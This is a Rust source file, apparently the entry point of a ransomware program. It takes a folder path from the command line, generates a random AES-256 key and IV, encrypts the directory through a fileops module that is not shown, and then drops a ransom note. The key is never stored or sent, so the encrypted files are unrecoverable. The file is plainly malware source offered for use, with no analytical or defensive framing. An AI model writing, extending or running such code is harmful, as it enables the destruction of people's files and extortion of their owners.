use std::env;
use std::path::Path;
use rand::Rng;

mod fileops;

fn main() {
    // Get the folder path from CLI args
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: {} <folder_path>", args[0]);
        std::process::exit(1);
    }

    let target_folder = &args[1];
    let path = Path::new(target_folder);

    if !path.exists() || !path.is_dir() {
        eprintln!("[!] Provided path is invalid or not a directory: {}", target_folder);
        std::process::exit(1);
    }

    // Generate a random 256-bit AES key and 128-bit IV
    let mut rng = rand::thread_rng();
    let mut key = [0u8; 32];
    let mut iv = [0u8; 16];
    rng.fill(&mut key);
    rng.fill(&mut iv);

    println!("[+] Starting encryption for: {}", path.display());
    fileops::encrypt_directory(path, &key, &iv);

    println!("[+] Dropping ransom note...");
    fileops::drop_ransom_note();

    println!("[✓] Done.");
}
